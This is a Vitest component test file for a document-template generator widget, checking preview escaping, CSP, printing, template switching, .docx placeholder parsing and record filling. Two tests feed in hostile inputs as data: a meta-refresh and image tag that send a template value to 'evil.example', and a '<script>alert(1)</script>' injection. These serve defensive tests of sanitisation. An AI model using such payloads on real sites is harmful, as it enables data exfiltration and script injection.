/**
 * TemplateGenerator (Cluster E, plan 063) — component test, real timers
 * (repo convention: vi.useFakeTimers strands React 19's scheduler). Renders
 * inside StrictMode since the app mounts under it.
 *
 * Covers: typed values reach the preview iframe's srcdoc HTML-escaped
 * (including a `<script>` value); the type select drives the value input's
 * `type`; Print calls the preview iframe's `contentWindow.print`; New +
 * rename + switch keeps each template's values apart; loading a .docx
 * fixture lists its placeholder keys; FillFromRecord's loaded / error /
 * empty states.
 */
import { StrictMode } from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import JSZip from 'jszip';

vi.mock('../lib/oneSaveClient', () => ({
    ONE_SAVE_ENABLED: false,
    oneSaveClient: {
        get: vi.fn().mockResolvedValue(null),
        put: vi.fn().mockResolvedValue(undefined),
        remove: vi.fn().mockResolvedValue(undefined),
        history: vi.fn(),
    },
}));

// Real mammoth cannot run under vitest/jsdom (see docxFill.test.ts) — the
// component's DOCX-mode preview effect calls docxToHtml automatically the
// moment a file loads, so it must be mocked here too. extractDocxKeys and
// fillDocx stay real (jszip works fine under vitest).
vi.mock('../components/DocViewer/docxFill', async (importOriginal) => {
    const actual = await importOriginal<typeof import('../components/DocViewer/docxFill')>();
    return { ...actual, docxToHtml: vi.fn(async () => '<p>mock docx preview</p>') };
});

vi.mock('../components/StrataDashboard/useStrataQueries', () => ({
    useProperties: vi.fn(),
    useEntities: vi.fn(),
}));

import TemplateGenerator from '../components/DocViewer/TemplateGenerator';
import { templateGeneratorStore } from '../utils/templateGeneratorStore';
import { useEntities, useProperties } from '../components/StrataDashboard/useStrataQueries';

const WORDML_NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';

async function buildDocxFixture(): Promise<File> {
    const zip = new JSZip();
    zip.file('[Content_Types].xml', '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>');
    zip.file(
        'word/document.xml',
        `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="${WORDML_NS}"><w:body>` +
        '<w:p><w:r><w:t>Dear {{tenant_name}},</w:t></w:r></w:p></w:body></w:document>',
    );
    const blob = await zip.generateAsync({ type: 'blob' });
    return new File([blob], 'lease.docx', {
        type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    });
}

function renderWidget() {
    return render(
        <StrictMode>
            <TemplateGenerator />
        </StrictMode>,
    );
}

/** The `.tg-var-row` containing a given key's `{{key}}` chip. */
function rowFor(key: string): HTMLElement {
    const chip = screen.getByText(`{{${key}}}`);
    return chip.closest('.tg-var-row') as HTMLElement;
}

beforeEach(() => {
    localStorage.clear();
    templateGeneratorStore.reset();
    vi.mocked(useProperties).mockReturnValue({ data: [], isLoading: false, isError: false } as never);
    vi.mocked(useEntities).mockReturnValue({ data: [], isLoading: false, isError: false } as never);
});

afterEach(() => {
    cleanup();
});

describe('TemplateGenerator', () => {
    // A store write on mount bumps One Save's localWriteSeq while the first
    // hydrate GET is in flight: the account's saved templates are discarded and
    // the local default is synced over them. Only a user's edit may write.
    it('mounting writes nothing to the store, yet an empty date previews as today', async () => {
        const setSpy = vi.spyOn(templateGeneratorStore, 'set');
        const { container } = renderWidget();
        const iframe = container.querySelector('iframe') as HTMLIFrameElement;
        await waitFor(() => {
            expect(iframe.getAttribute('srcdoc')).toContain(new Date().toLocaleDateString());
        });
        expect(setSpy).not.toHaveBeenCalled();
        expect(Object.keys(localStorage).filter((k) => k.startsWith('dwellium:templateGenerator'))).toEqual([]);
        setSpy.mockRestore();
    });

    it('a malformed payload hydrated by One Save (templates: []) renders the default instead of crashing', () => {
        // hydrate() bypasses the deserializer: put the bad value straight into the store, as it does.
        templateGeneratorStore.set({ templates: [], activeId: 'gone' } as never, () => {});
        const { container } = renderWidget();
        expect(screen.getByLabelText('Template name')).toHaveValue('Property report');
        expect(container.querySelector('iframe')).not.toBeNull();
    });

    it('the preview document carries the no-remote-loads CSP, and a template <meta refresh> is dropped', async () => {
        const { container } = renderWidget();
        const editor = container.querySelector('textarea') as HTMLTextAreaElement;
        fireEvent.change(editor, { target: { value: '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/?n={{n}}"></head><body><img src="https://evil.example/p.png?n={{n}}">{{n}}</body></html>' } });
        const iframe = container.querySelector('iframe') as HTMLIFrameElement;
        await waitFor(() => expect(iframe.getAttribute('srcdoc')).toContain("default-src 'none'"));
        expect(iframe.getAttribute('srcdoc')).not.toMatch(/http-equiv="refresh"/i);
    });

    it('typing a variable value updates the preview iframe srcdoc, HTML-escaped', async () => {
        const { container } = renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        const input = rowFor('title').querySelector('input') as HTMLInputElement;
        fireEvent.change(input, { target: { value: '<b>Ada</b>' } });

        const iframe = container.querySelector('iframe') as HTMLIFrameElement;
        await waitFor(() => {
            expect(iframe.getAttribute('srcdoc')).toContain('&lt;b&gt;Ada&lt;/b&gt;');
        });
        expect(iframe.getAttribute('srcdoc')).not.toContain('<b>Ada</b>');
    });

    it('a <script> value never appears as a live tag in the preview', async () => {
        const { container } = renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        const input = rowFor('title').querySelector('input') as HTMLInputElement;
        fireEvent.change(input, { target: { value: '<script>alert(1)</script>' } });

        const iframe = container.querySelector('iframe') as HTMLIFrameElement;
        await waitFor(() => {
            const srcdoc = iframe.getAttribute('srcdoc') ?? '';
            expect(srcdoc).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
            expect(srcdoc).not.toContain('<script>alert(1)</script>');
        });
    });

    it('changing a variable\'s type select changes its value input\'s type attribute', () => {
        renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        const row = rowFor('title');
        const select = row.querySelector('select') as HTMLSelectElement;
        const input = row.querySelector('input') as HTMLInputElement;
        expect(input.type).toBe('text');

        fireEvent.change(select, { target: { value: 'date' } });
        expect(input.type).toBe('date');

        fireEvent.change(select, { target: { value: 'number' } });
        expect(input.type).toBe('number');
    });

    it('Print / Save as PDF calls the preview iframe\'s contentWindow.print', () => {
        const { container } = renderWidget();
        const iframe = container.querySelector('iframe') as HTMLIFrameElement;
        expect(iframe.contentWindow).toBeTruthy();
        const printSpy = vi.fn();
        Object.defineProperty(iframe.contentWindow, 'print', { value: printSpy, configurable: true });

        fireEvent.click(screen.getByRole('button', { name: /Print \/ Save as PDF/ }));
        expect(printSpy).toHaveBeenCalledTimes(1);
    });

    it('New + rename + switch keeps each template\'s values apart', () => {
        renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));

        fireEvent.change(rowFor('title').querySelector('input') as HTMLInputElement, { target: { value: 'Alpha' } });

        fireEvent.click(screen.getByRole('button', { name: 'New template' }));
        fireEvent.change(rowFor('title').querySelector('input') as HTMLInputElement, { target: { value: 'Beta' } });
        fireEvent.change(screen.getByLabelText('Template name'), { target: { value: 'Lease notice' } });

        const templateSelect = screen.getByLabelText('Template') as HTMLSelectElement;
        const [firstId, secondId] = Array.from(templateSelect.options).map((o) => o.value);

        fireEvent.change(templateSelect, { target: { value: firstId } });
        expect((rowFor('title').querySelector('input') as HTMLInputElement).value).toBe('Alpha');

        fireEvent.change(templateSelect, { target: { value: secondId } });
        expect((rowFor('title').querySelector('input') as HTMLInputElement).value).toBe('Beta');
        expect((screen.getByLabelText('Template name') as HTMLInputElement).value).toBe('Lease notice');
    });

    it('loading a .docx fixture lists its placeholder keys', async () => {
        renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'DOCX Template' }));
        const file = await buildDocxFixture();
        const input = document.querySelector('input[type="file"]') as HTMLInputElement;
        fireEvent.change(input, { target: { files: [file] } });

        await waitFor(() => expect(screen.getByText('lease.docx')).toBeInTheDocument());
        expect(screen.getByText('1 placeholder')).toBeInTheDocument();

        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        expect(screen.getByText('{{tenant_name}}')).toBeInTheDocument();
    });

    it('FillFromRecord (loaded): applies the matching field, never the unmatched ones', async () => {
        vi.mocked(useProperties).mockReturnValue({
            data: [{ id: 'p1', name: 'Maple House', address: '1 Maple St', city: 'Metropolis', state: 'NY', zip: '10001' }],
            isLoading: false,
            isError: false,
        } as never);
        renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        fireEvent.click(screen.getByRole('button', { name: 'Fill from Dwellium records' }));
        fireEvent.change(screen.getByLabelText('Record'), { target: { value: 'p1' } });
        fireEvent.click(screen.getByRole('button', { name: 'Fill' }));

        await waitFor(() => {
            const input = rowFor('property_address').querySelector('input') as HTMLInputElement;
            expect(input.value).toBe('1 Maple St, Metropolis, NY, 10001');
        });
        expect(screen.getByText('Filled 1 field')).toBeInTheDocument();
    });

    it('FillFromRecord (error): reads honestly when the query fails', () => {
        vi.mocked(useProperties).mockReturnValue({ data: undefined, isLoading: false, isError: true } as never);
        renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        fireEvent.click(screen.getByRole('button', { name: 'Fill from Dwellium records' }));
        expect(screen.getByText("Couldn't load records. Is the backend connected?")).toBeInTheDocument();
    });

    it('FillFromRecord (empty): reads honestly when there are no records yet', () => {
        vi.mocked(useProperties).mockReturnValue({ data: [], isLoading: false, isError: false } as never);
        renderWidget();
        fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
        fireEvent.click(screen.getByRole('button', { name: 'Fill from Dwellium records' }));
        expect(screen.getByText('No property records yet.')).toBeInTheDocument();
    });
});
